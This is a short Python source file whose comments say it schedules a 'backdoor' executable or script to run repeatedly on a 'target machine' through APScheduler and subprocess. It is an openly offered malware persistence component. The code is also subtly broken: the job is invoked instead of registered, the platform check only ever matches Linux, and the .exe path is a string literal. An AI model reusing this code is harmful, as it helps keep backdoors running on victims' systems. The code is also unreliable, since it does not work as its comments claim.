# Import APIScheduler to schedule running backdoor.exe file on target machine (BackgroundScheduler)
from apscheduler.schedulers.background import BackgroundScheduler as Scheduler
# Import subprocess as to open cmd and run commands
import subprocess
# Import time to sleep
import time
# Import platform module to know which platform/os is run on the computer
import platform


# Run this method every thirty (30) seconds using Windows Task Scheduler
def schedule_task(file, directory_path):
    file_parts = file.split('.')
    file_extension = file_parts[1]
    # Store the command that needs to be run, to start the exe or py file
    cmd = ''
    file_location = ''
    if 'Windows' in platform.platform():
        file_location = directory_path + "\\" + file
    elif ('Linux' or 'Mac') in platform.platform():
        file_location = directory_path + "/" + file
    if file_extension == 'py':
        cmd = ["python3", file_location]
    elif file_extension == 'exe':
        cmd = ["start", "file_location.exe"]

    # Running the backdoor file
    subprocess.run(cmd)


def schedule(file, directory_path, interval):
    # Create an Instance of Scheduler Class
    scheduler = Scheduler()
    # Add the schedule_task method to the scheduler
    scheduler.add_job(schedule_task(file, directory_path),
                      'interval',
                      seconds=interval)
    # Start the Scheduler
    scheduler.start()

    # Try and catch (except)
    try:
        while True:
            time.sleep(2)
    except (KeyboardInterrupt, SystemExit):
        scheduler.shutdown()
